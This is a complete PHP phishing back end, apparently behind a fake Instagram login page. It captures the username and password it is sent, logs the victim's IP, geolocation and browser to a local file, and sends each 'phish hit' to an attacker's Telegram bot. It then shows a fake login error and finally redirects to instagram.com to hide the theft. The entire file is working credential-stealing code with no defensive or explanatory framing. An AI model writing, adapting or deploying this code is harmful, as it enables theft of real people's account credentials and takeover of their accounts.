<?php
session_start();

// Victim Info
$user = $_POST['username'] ?? 'N/A';
$pass = $_POST['password'] ?? 'N/A';

$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
$details = json_decode(@file_get_contents("http://ipinfo.io/{$ip}/json"));
$location = ($details && isset($details->city)) ? "{$details->city}, {$details->region}, {$details->country}" : "Unknown";

// Save Locally
$log = "Username: $user\nPassword: $pass\nIP: $ip\nLocation: $location\nAgent: $agent\n=================\n";
file_put_contents("creds.txt", $log, FILE_APPEND);

// 🚀 Send to Telegram
$bot_token ="YOUR_BOT_TOKEN_HERE";
$chat_id ="YOUR_CHAT_ID_HERE";

$message = "🎯 *New Phish Hit:*\n👤 `$user`\n🔑 `$pass`\n🌐 `$ip - $location`\n📱 `$agent`";

$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

file_get_contents($url . "?" . http_build_query($data));

// Fake login fail
if (!isset($_SESSION['tried_once'])) {
    $_SESSION['tried_once'] = true;
    header("Location: index.html?error=1");
} else {
    session_destroy();
    header("Location: https://instagram.com");
}
exit();
?>
